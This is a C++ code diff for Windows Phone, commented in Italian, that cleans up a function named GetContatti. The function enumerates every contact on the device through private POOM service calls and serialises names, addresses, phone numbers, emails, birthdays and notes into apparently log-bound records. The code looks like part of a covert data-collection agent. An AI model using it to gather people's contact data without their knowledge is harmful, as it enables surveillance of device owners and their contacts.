@@ -4,56 +4,10 @@
 ///#include "MAPIAgent.h"
 ///#include "PoomMan.h"
 #include "FunctionFunc.h"
+#include "PoomCommon.h"
+#include "Log.h"
 
 
-
-
-HRESULT ContactChooserExample(void)
-{
-    HRESULT hr                      = E_FAIL;    
-    const CEPROPID c_propidAllEmail = PIMPR_ALL_EMAIL; 
-    CHOOSECONTACT cc                = {0};
-
-    // Setup the CHOOSECONTACT structure.
-    cc.cbSize                     = sizeof (cc);
-    cc.dwFlags                    = CCF_RETURNCONTACTNAME | CCF_RETURNPROPERTYVALUE | CCF_HIDENEW;
-    cc.rgpropidRequiredProperties = &c_propidAllEmail;
-
-    // The number of properties specified in the c_propidAllEmail array.
-    cc.cRequiredProperties = 1;
-    cc.hwndOwner           = NULL;
-
-    // Display the Contact Chooser control, and prompt the user to choose a Contact.
-    hr = _ChooseContact(&cc);
-
-    // The name, and a string representation of the property, is returned according to the flags set in the CHOOSECONTACT structure above.
-   // DEBUGMSG(TRUE, (L"%s's email address is %s", cc.bstrContactName, cc.bstrPropertyValueSelected));
-
-    // Free memory.
-    //SysFreeString(cc.bstrContactName);
-    //SysFreeString(cc.bstrPropertyValueSelected);
-
-    return hr;
-}
-
-/*
-public class Object
-{
-    // Methods
-    public Object();
-    public virtual bool Equals(object obj);
-    public static bool Equals(object objA, object objB);
-    private void FieldGetter(string typeName, string fieldName, ref object val);
-    private void FieldSetter(string typeName, string fieldName, object val);
-    protected virtual void Finalize();
-    private FieldInfo GetFieldInfo(string typeName, string fieldName);
-    public virtual int GetHashCode();
-    public extern Type GetType();
-    protected extern object MemberwiseClone();
-    public static bool ReferenceEquals(object objA, object objB);
-    public virtual string ToString();
-}
-*/
 
 typedef struct _SOURCEDPROPVAL
 {
@@ -110,8 +64,10 @@ typedef enum _NETWORK_SOURCE_ID
     NWindowsLive = 1
 } NETWORK_SOURCE_ID;
 
- 
 
+#define	_PIMPR_ERROR_ACCESS_DENIED 0x80070005
+#define	_PIMPR_ERROR_NOT_FOUND  0x80070490
+#define	_PIMPR_S_OK 0
 
 
 typedef enum _PIMPR_PROPS
@@ -181,275 +137,12 @@ typedef enum _PIMPR_PROPS
 } PIMPR_PROPS;
 
 
- /*
-internal enum PIMPR_PROPS : uint
-{
-    PIMPR_ALL_DAY_EVENT = 0x44000b,
-    PIMPR_BODY_TEXT = 0x101f001f,
-    PIMPR_BUSINESS_ADDRESS = 0x10c0001f,
-    PIMPR_BUSINESS_ADDRESS_CITY = 0xc2001f,
-    PIMPR_BUSINESS_ADDRESS_COUNTRY = 0xc5001f,
-    PIMPR_BUSINESS_ADDRESS_POSTAL_CODE = 0xc4001f,
-    PIMPR_BUSINESS_ADDRESS_STATE = 0xc3001f,
-    PIMPR_BUSINESS_ADDRESS_STREET = 0xc1001f,
-    PIMPR_BUSINESS_FAX_NUMBER = 0x9b001f,
-    PIMPR_BUSINESS_TELEPHONE_NUMBER = 0x97001f,
-    PIMPR_BUSINESS2_TELEPHONE_NUMBER = 0x98001f,
-    PIMPR_BUSY_STATUS = 0x450013,
-    PIMPR_CHILDREN = 0xa6001f,
-    PIMPR_COMPANY_NAME = 0x8a001f,
-    PIMPR_COMPANY_TELEPHONE_NUMBER = 0xa0001f,
-    PIMPR_DISPLAY_NAME = 0x10a4001f,
-    PIMPR_EMAIL_ADDRESS = 0x3003001f,
-    PIMPR_EMAIL1_ADDRESS = 0x90001f,
-    PIMPR_EMAIL2_ADDRESS = 0x91001f,
-    PIMPR_EMAIL3_ADDRESS = 0x92001f,
-    PIMPR_END = 0x10430040,
-    PIMPR_FIRST_NAME = 0x82001f,
-    PIMPR_FLOATING_BIRTHDAY = 0xf20040,
-    PIMPR_HOME_ADDRESS = 0x10d0001f,
-    PIMPR_HOME_ADDRESS_CITY = 0xd2001f,
-    PIMPR_HOME_ADDRESS_COUNTRY = 0xd5001f,
-    PIMPR_HOME_ADDRESS_POSTAL_CODE = 0xd4001f,
-    PIMPR_HOME_ADDRESS_STATE = 0xd3001f,
-    PIMPR_HOME_ADDRESS_STREET = 0xd1001f,
-    PIMPR_HOME_FAX_NUMBER = 0x9c001f,
-    PIMPR_HOME_TELEPHONE_NUMBER = 0x99001f,
-    PIMPR_HOME2_TELEPHONE_NUMBER = 0x9a001f,
-    PIMPR_IS_FAVORITE = 0x105000b,
-    PIMPR_JOB_INFO = 0xac001f,
-    PIMPR_JOB_TITLE = 0x8c001f,
-    PIMPR_LAST_NAME = 0x84001f,
-    PIMPR_LOCATION = 0x41001f,
-    PIMPR_MEETING_ORGANIZER_EMAIL = 0x55001f,
-    PIMPR_MEETING_ORGANIZER_NAME = 0x51001f,
-    PIMPR_MIDDLE_NAME = 0x83001f,
-    PIMPR_MOBILE_TELEPHONE_NUMBER = 0x96001f,
-    PIMPR_MOBILE2_TELEPHONE_NUMBER = 0x9e001f,
-    PIMPR_NAME = 0x3001001f,
-    PIMPR_NETWORK_SOURCE_ID = 0x1ae0013,
-    PIMPR_NICKNAME = 0x86001f,
-    PIMPR_OFFICE_LOCATION = 0x8e001f,
-    PIMPR_OTHER_ADDRESS = 0x10e0001f,
-    PIMPR_OTHER_ADDRESS_CITY = 0xe2001f,
-    PIMPR_OTHER_ADDRESS_COUNTRY = 0xe5001f,
-    PIMPR_OTHER_ADDRESS_POSTAL_CODE = 0xe4001f,
-    PIMPR_OTHER_ADDRESS_STATE = 0xe3001f,
-    PIMPR_OTHER_ADDRESS_STREET = 0xe1001f,
-    PIMPR_PAGER_NUMBER = 0x9d001f,
-    PIMPR_SENSITIVITY = 0x210013,
-    PIMPR_SPOUSE = 0xa5001f,
-    PIMPR_START = 0x10420040,
-    PIMPR_SUBJECT = 0x20001f,
-    PIMPR_SUFFIX = 0x85001f,
-    PIMPR_TITLE = 0x81001f,
-    PIMPR_WEB_PAGE = 0xa7001f,
-    PIMPR_YOMI_COMPANY = 0x89001f,
-    PIMPR_YOMI_FIRSTNAME = 0x87001f,
-    PIMPR_YOMI_LASTNAME = 0x88001f
-}
-
-*/
-
-
 typedef struct _ACCOUNT
 {
     unsigned int cProps;
     void * rgPropVals;
     unsigned int fIsDefaultStore;
 } ACCOUNT;
-
-class PhoneAccount
-{
-	private:
-		ACCOUNT	*obj;
-	public:
-		PhoneAccount(ACCOUNT *a) : obj(a) { };
-
-		StorageKind Kind() 
-		{ 
-			return (obj->fIsDefaultStore) ? StorageKind::Phone : StorageKind::Other; 
-		};
-		
-		LPSTR Name() 
-		{ 
-			CEPROPVAL *ce = (CEPROPVAL *)obj->rgPropVals; 
-			CEPROPVAL *v = &ce[0];
-
-			return (LPSTR) v->val.lpwstr;
-		};
-
-};
-
-//class ContactPhoneNumber
-//{
-//    // Fields
-//	private:
-//		//List<Account> _accounts = new List<Account>();
-//		ACCOUNT	*obj;
-//	public:
-//    // Methods
-//    ContactPhoneNumber()
-//    {
-//    };
-//
-//    
-//    //public override string ToString()
-//    //{
-//    //    return string.Format(CultureInfo.CurrentCulture, "{0} ({1})", new object[] { this.PhoneNumber, this.Kind });
-//    //}
-//
-//    // Properties
-//    PhoneNumberKind Kind { };
-//
-//	LPSTR PhoneNumber {  };
-//}
-
-
-
-
-class PhoneContact
-{
-	private:
-		CONTACT	*obj;
-		ACCOUNT *accounts;
-
-	public:
-		PhoneContact(CONTACT *serialized) : obj(serialized)
-		{
-			/*
-				this._phoneNumbers = new List<ContactPhoneNumber>();
-				this._emailAddresses = new List<ContactEmailAddress>();
-				this._addresses = new List<ContactAddress>();
-				this._companies = new List<ContactCompanyInformation>();
-				this._websites = new List<string>();
-				this._significantOthers = new List<string>();
-				this._children = new List<string>();
-				this._notes = new List<string>();
-				this._birthdays = new List<DateTime>();
-				this._accounts = new List<Account>();
-			*/
-			accounts = (ACCOUNT *) obj->rgAccounts;
-
-		};
-
-		
-
-
-
-		int NumberOfAccounts() { return obj->cSources; };
-		int SizeOfAccounts() { return obj->cSources * sizeof(ACCOUNT); };
-
-
-		int CProps() { return obj->cProps; };
-		int CAggregatedProps() { return obj->cAggregatedProps; };
-		int CSources() { return obj->cSources; };
-		int ContactId() { return obj->contactId; };
-/*
-	unsigned int cProps;
-    void *rgPropVals;
-    unsigned int cAggregatedProps;
-    void *rgAggregatedPropVals;
-    unsigned int cSources;
-    void *rgAccounts;
-    unsigned int contactId;
-*/
-
-
-		PhoneAccount *GetAccount(int i) { return new PhoneAccount(&accounts[i]); };
-};
-
-/*
-public class Object
-{
-    // Methods
-    public bool Equals(object obj)
-    {
-        //return RuntimeHelpers.Equals(this, obj);
-		return true;
-    }
-
-    public bool Equals(object objA, object objB)
-    {
-        //return ((objA == objB) || (((objA != null) && (objB != null)) && objA.Equals(objB)));
-		return true;
-    }
-
-    private void FieldGetter(string typeName, string fieldName, ref object val)
-    {
-        //val = this.GetFieldInfo(typeName, fieldName).GetValue(this);
-    }
-
-    private void FieldSetter(string typeName, string fieldName, object val)
-    {
-		
-        //FieldInfo fieldInfo = this.GetFieldInfo(typeName, fieldName);
-        //if (fieldInfo.IsInitOnly)
-        //{
-        //    throw new FieldAccessException(Environment.GetResourceString("FieldAccess_InitOnly"));
-        //}
-        //Type fieldType = fieldInfo.FieldType;
-        //if (fieldType.IsByRef)
-        //{
-        //    fieldType = fieldType.GetElementType();
-        //}
-        //if (!fieldType.IsInstanceOfType(val))
-        //{
-        //    val = Convert.ChangeType(val, fieldType, CultureInfo.InvariantCulture);
-        //}
-        //fieldInfo.SetValue(this, val);
-		
-    }
-
-    protected virtual void Finalize()
-    {
-    }
-
-    private FieldInfo GetFieldInfo(string typeName, string fieldName)
-    {
-		
-        //Type baseType = this.GetType();
-        //while (baseType != null)
-        //{
-        //    if (baseType.FullName.Equals(typeName))
-        //    {
-        //        break;
-        //    }
-        //    baseType = baseType.BaseType;
-        //}
-        //if (baseType == null)
-        //{
-        //    throw new ArgumentException();
-        //}
-        //FieldInfo field = baseType.GetField(fieldName, BindingFlags.Public | BindingFlags.Instance | BindingFlags.IgnoreCase);
-        //if (field == null)
-        //{
-        //    throw new ArgumentException();
-        //}
-        //return field;
-		
-    }
-
-    public virtual int GetHashCode()
-    {
-        //return RuntimeHelpers.GetHashCode(this);
-    }
-
-    public extern Type GetType();
-    protected extern object MemberwiseClone();
-    public static bool ReferenceEquals(object objA, object objB)
-    {
-        //return (objA == objB);
-    }
-
-    public virtual string ToString()
-    {
-       // return this.GetType().ToString();
-    }
-}
-*/
-
-
 
 typedef struct _COMPLETENAMEACC
 {
@@ -523,93 +216,11 @@ typedef struct _SOURCE
 } SOURCE;
 
 
-#include <list>
-#include <iostream>
 
 void HandleMultiValuedProperties(unsigned int cAggregatedProps,void *rgAggregatedPropVals, CONTACTACC* contact)
 {
 	SOURCEDPROPVAL* ptrS;
 	CEPROPVAL* ptrPS;
-/*
-	quiesta parte l'ho tolta peche' mi serve solo per ricostruire le info di:
-	PIMPR_HOME_ADDRESS:
-	PIMPR_PROPS.PIMPR_OTHER_ADDRESS:
-	PIMPR_PROPS.PIMPR_JOB_INFO:
-	PIMPR_PROPS.PIMPR_BUSINESS_ADDRESS:
-	queste info sono un aggregato di info gia' presenti es.
-	PIMPR_HOME_ADDRESS = _PIMPR_HOME_ADDRESS_STREET + _PIMPR_HOME_ADDRESS_CITY + _PIMPR_HOME_ADDRESS_STATE + _PIMPR_HOME_ADDRESS_POSTAL_CODE +_PIMPR_HOME_ADDRESS_COUNTRY
-
-	list<list<SOURCE>> accountIndexes;
-	list<list<SOURCE>> list5;
-	list<list<SOURCE>> list4;
-	list<list<SOURCE>> list3;
-
-
-
-
-	
-    for (int i = 0; i < cAggregatedProps; i++)
-    {
-		ptrS=(SOURCEDPROPVAL*)rgAggregatedPropVals+i;
-		SOURCE *ptrSOURCE;
-
-		list<SOURCE> item;
-
-		for (UINT j = 0; j < ptrS->cSources; j++)
-		{
-			ptrSOURCE=(SOURCE*)ptrS->rgSources+j;
-			item.insert(item.begin(),*ptrSOURCE);
-		}
-
-		ptrPS=((CEPROPVAL*)ptrS->pPropVal);
-	
-		
-
-		switch (((PIMPR_PROPS) ptrPS->propid))
-        {
-		
-            case _PIMPR_HOME_ADDRESS:
-                list5.insert(list5.begin(),item);
-                break;
-
-            case _PIMPR_OTHER_ADDRESS:
-				list3.insert(list3.begin(),item);
-                break;
-
-            case _PIMPR_JOB_INFO:
-				accountIndexes.insert(accountIndexes.begin(),item);
-                break;
-
-            case _PIMPR_BUSINESS_ADDRESS:
-				list4.insert(list4.begin(),item);
-                break;
-				
-        }
-		
-    }
-
-	//contact.AddAddresses(AddressKind.Home, list5);
-    //contact.AddAddresses(AddressKind.Work, list4);
-    //contact.AddAddresses(AddressKind.Other, list3);
-
-	*/
-
-	/*
-				int si=0;
-				si=accountIndexes.size();
-
-				for (std::list<list<SOURCE>>::iterator it = accountIndexes.begin(); it != accountIndexes.end(); it++)
-				{
-					
-					for (std::list<SOURCE>::iterator it2 = it->begin(); it2 != it->end(); it2++)
-					{
-						WCHAR msg[128];
-						swprintf_s(msg, L"it2->contactId=%i it2->sourceIndex=%i\n",it2->contactId,it2->sourceIndex);
-						OutputDebugString(msg);
-					}
-				}
-*/
-
 
 
 	for (int i = 0; i < cAggregatedProps; i++)
@@ -630,37 +241,30 @@ void HandleMultiValuedProperties(unsigned int cAggregatedProps,void *rgAggregate
 		switch (((PIMPR_PROPS) ptrPS->propid))
         {
             case _PIMPR_JOB_TITLE:
-                //contact.UpdateCompany(this.GetString(cepropval.val.lpwstr), COMPANY_PART.JobTitle, item);
 				contact->CONTACT_PIMPR_JOB_TITLE=ptrPS->val.lpwstr;	
                 break;
 
             case _PIMPR_OFFICE_LOCATION:
-                //contact.UpdateCompany(this.GetString(cepropval.val.lpwstr), COMPANY_PART.OfficeLocation, item);
 				contact->CONTACT_PIMPR_OFFICE_LOCATION=ptrPS->val.lpwstr;	
                 break;
 
             case _PIMPR_YOMI_COMPANY:
-                //contact.UpdateCompany(this.GetString(cepropval.val.lpwstr), COMPANY_PART.YomiCompanyName, item);
 				contact->CONTACT_PIMPR_YOMI_COMPANY=ptrPS->val.lpwstr;	
                 break;
 
             case _PIMPR_COMPANY_NAME:
-                //contact.UpdateCompany(this.GetString(cepropval.val.lpwstr), COMPANY_PART.CompanyName, item);
 				contact->CONTACT_PIMPR_COMPANY_NAME=ptrPS->val.lpwstr;	
                 break;
 
             case _PIMPR_EMAIL1_ADDRESS:
-                //contact.AddEmail(this.GetString(cepropval.val.lpwstr), EmailAddressKind.Personal, item);
 				contact->CONTACT_PIMPR_EMAIL1_ADDRESS=ptrPS->val.lpwstr;	
                 break;
 
             case _PIMPR_EMAIL2_ADDRESS:
-                //contact.AddEmail(this.GetString(cepropval.val.lpwstr), EmailAddressKind.Work, item);
 				contact->CONTACT_PIMPR_EMAIL2_ADDRESS=ptrPS->val.lpwstr;	
                 break;
 
             case _PIMPR_EMAIL3_ADDRESS:
-                //contact.AddEmail(this.GetString(cepropval.val.lpwstr), EmailAddressKind.Other, item);
 				contact->CONTACT_PIMPR_EMAIL3_ADDRESS=ptrPS->val.lpwstr;	
                 break;
 
@@ -669,7 +273,6 @@ void HandleMultiValuedProperties(unsigned int cAggregatedProps,void *rgAggregate
 				break;
 
             case _PIMPR_MOBILE2_TELEPHONE_NUMBER:
-                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.Mobile, item);
 				contact->CONTACT_PIMPR_MOBILE2_TELEPHONE_NUMBER=ptrPS->val.lpwstr;	
                 break;
 
@@ -678,7 +281,6 @@ void HandleMultiValuedProperties(unsigned int cAggregatedProps,void *rgAggregate
 				break;
 
             case _PIMPR_BUSINESS2_TELEPHONE_NUMBER:
-                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.Work, item);
 				contact->CONTACT_PIMPR_BUSINESS2_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
                 break;
 
@@ -687,137 +289,110 @@ void HandleMultiValuedProperties(unsigned int cAggregatedProps,void *rgAggregate
 					break;
 
             case _PIMPR_HOME_TELEPHONE_NUMBER:
-                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.Home, item);
 				contact->CONTACT_PIMPR_HOME_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_BUSINESS_FAX_NUMBER:
-                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.WorkFax, item);
 				contact->CONTACT_PIMPR_BUSINESS_FAX_NUMBER=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_HOME_FAX_NUMBER:
-                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.HomeFax, item);
 				contact->CONTACT_PIMPR_HOME_FAX_NUMBER=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_PAGER_NUMBER:
-                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.Pager, item);
 				contact->CONTACT_PIMPR_PAGER_NUMBER=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_COMPANY_TELEPHONE_NUMBER:
-                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.Company, item);
 				contact->CONTACT_PIMPR_COMPANY_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_SPOUSE:
-                //contact.AddSignificantOther(this.GetString(cepropval.val.lpwstr));
 				contact->CONTACT_PIMPR_SPOUSE=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_BUSINESS_ADDRESS_STREET:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Street, AddressKind.Work, item);
 				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_STREET=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_BUSINESS_ADDRESS_CITY:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.City, AddressKind.Work, item);
 				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_CITY=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_CHILDREN:
-                //contact.AddChildren(this.GetString(cepropval.val.lpwstr));
 				contact->CONTACT_PIMPR_CHILDREN=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_WEB_PAGE:
-                //contact.AddWebsite(this.GetString(cepropval.val.lpwstr));
 				contact->CONTACT_PIMPR_WEB_PAGE=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_BUSINESS_ADDRESS_STATE:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.State, AddressKind.Work, item);
 				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_STATE=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_BUSINESS_ADDRESS_POSTAL_CODE:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.PostalCode, AddressKind.Work, item);
 				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_BUSINESS_ADDRESS_COUNTRY:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Country, AddressKind.Work, item);
 				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_COUNTRY=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_HOME_ADDRESS_STREET:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Street, AddressKind.Home, item);
 				contact->CONTACT_PIMPR_HOME_ADDRESS_STREET=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_HOME_ADDRESS_CITY:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.City, AddressKind.Home, item);
 				contact->CONTACT_PIMPR_HOME_ADDRESS_CITY=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_HOME_ADDRESS_COUNTRY:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Country, AddressKind.Home, item);
 				contact->CONTACT_PIMPR_HOME_ADDRESS_COUNTRY=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_OTHER_ADDRESS_STREET:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Street, AddressKind.Other, item);
 				contact->CONTACT_PIMPR_OTHER_ADDRESS_STREET=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_OTHER_ADDRESS_CITY:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.City, AddressKind.Other, item);
 				contact->CONTACT_PIMPR_OTHER_ADDRESS_CITY=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_HOME_ADDRESS_STATE:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.State, AddressKind.Home, item);
 				contact->CONTACT_PIMPR_HOME_ADDRESS_STATE=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_HOME_ADDRESS_POSTAL_CODE:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.PostalCode, AddressKind.Home, item);
 				contact->CONTACT_PIMPR_HOME_ADDRESS_POSTAL_CODE=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_OTHER_ADDRESS_STATE:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.State, AddressKind.Other, item);
 				contact->CONTACT_PIMPR_OTHER_ADDRESS_STATE=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_OTHER_ADDRESS_POSTAL_CODE:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.PostalCode, AddressKind.Other, item);
 				contact->CONTACT_PIMPR_OTHER_ADDRESS_POSTAL_CODE=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_OTHER_ADDRESS_COUNTRY:
-                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Country, AddressKind.Other, item);
 				contact->CONTACT_PIMPR_OTHER_ADDRESS_COUNTRY=ptrPS->val.lpwstr;
                 break;
 
             case _PIMPR_FLOATING_BIRTHDAY:
             {
-				//long fileTime = (ptrPS->val.filetime.dwHighDateTime << 0x20) + ptrPS->val.filetime.dwLowDateTime;
-
 				FILETIME fileTime = {ptrPS->val.filetime.dwLowDateTime, ptrPS->val.filetime.dwHighDateTime};
                 SYSTEMTIME lpUniversalTime,lpLocalTime;
                 FileTimeToSystemTime(&fileTime, &lpUniversalTime);
 				_SystemTimeToTzSpecificLocalTime(NULL,&lpUniversalTime ,&lpLocalTime);
 				
 				WCHAR msg[32];
-				swprintf_s(msg, L"%i/%i/%i\n",lpLocalTime.wYear,lpLocalTime.wMonth,lpLocalTime.wDay);
+				swprintf_s(msg, L"%02i/%02i/%04i",lpLocalTime.wDay,lpLocalTime.wMonth,lpLocalTime.wYear);
 				wcscpy((wchar_t*)contact->CONTACT_PIMPR_FLOATING_BIRTHDAY,msg);
-				OutputDebugString(msg);
                 break;
             }
             case _PIMPR_BODY_TEXT:
-                //contact.AddNotes(this.GetString(cepropval.val.lpwstr));
 				contact->CONTACT_PIMPR_BODY_TEXT=ptrPS->val.lpwstr;
                 break;
         }
@@ -838,20 +413,14 @@ void AddSingleValuePropertyToContact(CEPROPVAL *v,CONTACTACC* contact)
             switch (propid)
             {
                 case _PIMPR_MIDDLE_NAME:
-                    //this.EnsureContactHasCompleteName(contact);
-                    //contact.CompleteName.MiddleName = this.GetString(cePropVal.val.lpwstr);
 					contact->CompleteName.MiddleName=(LPCWSTR)v->val.lpwstr;
                     return;
 
                 case _PIMPR_LAST_NAME:
-                    //this.EnsureContactHasCompleteName(contact);
-                    //contact.CompleteName.LastName = this.GetString(cePropVal.val.lpwstr);
 					contact->CompleteName.LastName=(LPCWSTR)v->val.lpwstr;
                     return;
 
                 case _PIMPR_SUFFIX:
-                    //this.EnsureContactHasCompleteName(contact);
-                    //contact.CompleteName.Suffix = this.GetString(cePropVal.val.lpwstr);
 					contact->CompleteName.Suffix=(LPCWSTR)v->val.lpwstr;
                     return;
             }
@@ -859,8 +428,6 @@ void AddSingleValuePropertyToContact(CEPROPVAL *v,CONTACTACC* contact)
         }
         if (propid == _PIMPR_TITLE)
         {
-            //this.EnsureContactHasCompleteName(contact);
-            //contact.CompleteName.Title = this.GetString(cePropVal.val.lpwstr);
 			contact->CompleteName.Title=(LPCWSTR)v->val.lpwstr;
             return;
         }
@@ -877,44 +444,32 @@ void AddSingleValuePropertyToContact(CEPROPVAL *v,CONTACTACC* contact)
             {
                 if (propid == _PIMPR_YOMI_FIRSTNAME)
                 {
-                    //this.EnsureContactHasCompleteName(contact);
-                    //contact.CompleteName.YomiFirstName = this.GetString(cePropVal.val.lpwstr);
 					contact->CompleteName.YomiFirstName=(LPCWSTR)v->val.lpwstr;
                 }
                 return;
             }
-            //this.EnsureContactHasCompleteName(contact);
-            //contact.CompleteName.Nickname = this.GetString(cePropVal.val.lpwstr);
 			contact->CompleteName.Nickname=(LPCWSTR)v->val.lpwstr;
             return;
         }
         switch (propid)
         {
             case _PIMPR_YOMI_LASTNAME:
-                //this.EnsureContactHasCompleteName(contact);
-                //contact.CompleteName.YomiLastName = this.GetString(cePropVal.val.lpwstr);
 				contact->CompleteName.YomiLastName=(LPCWSTR)v->val.lpwstr;
                 return;
 
             case _PIMPR_IS_FAVORITE:
-                //contact.IsPinnedToStart = cePropVal.val.boolVal;
 				contact->IsPinnedToStart=(bool)v->val.boolVal;
                 return;
         }
         if (propid == _PIMPR_DISPLAY_NAME)
         {
-            //contact.DisplayName = this.GetString(cePropVal.val.lpwstr);
 			contact->DisplayName=(LPCWSTR)v->val.lpwstr;
         }
         return;
     }
-    //this.EnsureContactHasCompleteName(contact);
-    //contact.CompleteName.FirstName = this.GetString(cePropVal.val.lpwstr);
 	contact->CompleteName.FirstName=(LPCWSTR)v->val.lpwstr;
 
 }
-
-#include "PoomCommon.h"
 
 
 DWORD _SerializedStringLength(LPCWSTR lpString)
@@ -940,7 +495,6 @@ DWORD _Prefix(DWORD dwLength, int entryType)
 
 }
 
-
 void _SerializeString(LPBYTE *lpDest, LPCWSTR lpString, int entryType)
 {
 	DWORD dwStringLength = 0;
@@ -956,43 +510,34 @@ void _SerializeString(LPBYTE *lpDest, LPCWSTR lpString, int entryType)
 		return;
 
 	// copy prefix and string *** WITHOUT NULL TERMINATOR ***
-	DWORD prefix = _Prefix(dwStringLength, entryType);
+	DWORD prefix = _Prefix(dwStringLength, entryType << 0x18);
 	CopyMemory(*lpDest, &prefix, sizeof(prefix));
 	CopyMemory((*lpDest + sizeof(prefix)), lpString, dwStringLength);
 
 	*lpDest+=(sizeof(prefix) + dwStringLength);
-	//return sizeof(prefix) + dwStringLength;
 }
 
-#include "Log.h"
 
 
-DWORD  GetContatti(void)
+
+void  GetContatti(void)
 {
-	UINT r=_PoomDataServiceClient_Init();
+	UINT err=_PoomDataServiceClient_Init();
 
 	DWORD hPoom;
-	r=_PoomDataServiceClient_GetObjectsEnumerator(L"Contacts: All",&hPoom);
+	err=_PoomDataServiceClient_GetObjectsEnumerator(L"Contacts: All",&hPoom);
 
-	/*
-	da controllare se ci sono 0 contatti!!!
-	internal enum HRESULT : uint
-	{
-		ERROR_ACCESS_DENIED = 0x80070005,
-		ERROR_NOT_FOUND = 0x80070490,
-		S_OK = 0
-	}
+	//_PIMPR_ERROR_NOT_FOUND significa che ci sono 0 contatti
+	if(err==_PIMPR_ERROR_NOT_FOUND||err==_PIMPR_ERROR_ACCESS_DENIED)
+		 return;
 
-	*/
-
-
-	#define REQ_COUNT 1000 //se un utente ha piu' di 1000 contatti gli altri vengono persi
+	#define REQ_COUNT 2000 //se un utente ha piu' di 2000 contatti gli altri vengono persi
 	UINT requestedCount=REQ_COUNT;
 	UINT handleCount;
 	DWORD ptrArray[REQ_COUNT];
 
 
-	r=_PoomDataServiceClient_MoveNext(hPoom,requestedCount,&handleCount,ptrArray); //in handleCount mi ritrovo il numero di contatti che ho
+	err=_PoomDataServiceClient_MoveNext(hPoom,requestedCount,&handleCount,ptrArray); //in handleCount mi ritrovo il numero di contatti che ho
 
 	CONTACT **contacts = (CONTACT **) ptrArray;
 	CONTACT* ptrArr;
@@ -1002,7 +547,6 @@ DWORD  GetContatti(void)
 	ACCOUNT* ptrAcc;
 	CONTACT* ptrCon;
 
-	//StorageKind accountKind;
 
 	for(int i=0; i < handleCount; i++)
 	{
@@ -1131,7 +675,6 @@ DWORD  GetContatti(void)
 		header.lOid=contact.Id;
 		header.flags=NULL;
 		header.program=0x08; //visto che non riesco a tirare fuori gli id skype pur sapendo che è un conctact skype a sto punto li considero tutti contact phone
-		//header.dwSize = sizeof(HeaderStruct);
 
 
 		lpdwOutLength = sizeof(HeaderStruct);
@@ -1178,13 +721,60 @@ DWORD  GetContatti(void)
 		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_ADDRESS_COUNTRY);
 		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OTHER_ADDRESS_STATE);
 		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_FLOATING_BIRTHDAY);
-		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BODY_TEXT);
+		//lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BODY_TEXT);
+		wstring addNotes;
+		if(contact.CONTACT_PIMPR_BODY_TEXT!=NULL)
+		{
+			addNotes += contact.CONTACT_PIMPR_BODY_TEXT;
+		}
+		
+		addNotes += L" { ";
+
+		if(contact.CompleteName.Nickname!=NULL)
+		{
